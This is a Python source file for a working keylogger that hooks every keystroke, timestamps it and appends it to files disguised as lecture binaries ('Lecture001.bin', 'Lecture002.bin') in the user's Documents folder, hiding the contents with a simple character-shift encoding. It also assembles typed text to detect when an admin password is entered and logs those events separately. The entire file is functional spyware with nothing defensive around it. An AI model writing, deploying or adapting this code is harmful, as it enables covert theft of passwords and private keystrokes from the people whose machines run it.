import os
import keyboard
from datetime import datetime

# Use a path where you have write permissions
USER_HOME = os.path.expanduser("~")
BINARY_FILE = os.path.join(USER_HOME, 'Documents', 'Lecture001.bin')
ADMIN_FILE = os.path.join(USER_HOME, 'Documents', 'Lecture002.bin')

# Define the admin password to capture
ADMIN_PASSWORD = "adminpassword"
entered_password = ""

def encode_character(char: str) -> str:
    """Encode a character using a simple custom method."""
    if char.isascii():
        return chr((ord(char) + 7) % 256)
    return char

def text_to_encoded_binary(text: str) -> bytes:
    """Convert text to encoded binary representation."""
    encoded_text = ''.join(encode_character(char) for char in text)
    return encoded_text.encode('iso-8859-16')

def save_to_binary_file(data: bytes, file_path: str):
    """Save the binary data to the specified log file."""
    try:
        with open(file_path, 'ab') as f:
            f.write(data)
    except PermissionError:
        print(f"Permission denied: Unable to write to {file_path}.")

def get_timestamp() -> str:
    """Generate a timestamp in the format [YYYY-MM-DD HH:MM:SS]."""
    return datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')

def on_key_press(event):
    """Log each key press with a timestamp and detect admin password entry."""
    global entered_password
    timestamp = get_timestamp()
    
    # Handle special keys with readable labels
    if event.name == 'space':
        text = f"{timestamp} [SPACE]\n"
    elif event.name == 'enter':
        text = f"{timestamp} [ENTER]\n"
        # Check if the entered password matches the admin password
        if entered_password == ADMIN_PASSWORD:
            admin_text = f"{timestamp} Admin password entered\n"
            admin_data = text_to_encoded_binary(admin_text)
            save_to_binary_file(admin_data, ADMIN_FILE)  # Save to Lecture002.bin
        entered_password = ""  # Reset password entry after Enter
    elif event.name == 'backspace':
        text = f"{timestamp} [BACKSPACE]\n"
        entered_password = entered_password[:-1]  # Remove last character
    elif event.name in ['shift', 'ctrl', 'alt', 'windows', 'esc', 'caps lock']:
        text = f"{timestamp} [{event.name.upper()}]\n"
    elif len(event.name) == 1:  # Printable characters
        text = f"{timestamp} {event.name}\n"
        entered_password += event.name  # Build password string
    else:
        return  # Ignore unknown keys

    # Convert the text to encoded binary and save to Lecture001.bin
    binary_data = text_to_encoded_binary(text)
    save_to_binary_file(binary_data, BINARY_FILE)

# Register the keyboard event listener
keyboard.on_press(on_key_press)

try:
    print('Keylogger is running... (Press Ctrl+C to stop)')
    keyboard.wait()  # Wait indefinitely for key presses
except KeyboardInterrupt:
    print('\nLogging stopped.')
    print(f'Keys saved in encoded binary format in: {BINARY_FILE}')
    print(f'Admin password events saved in: {ADMIN_FILE}')
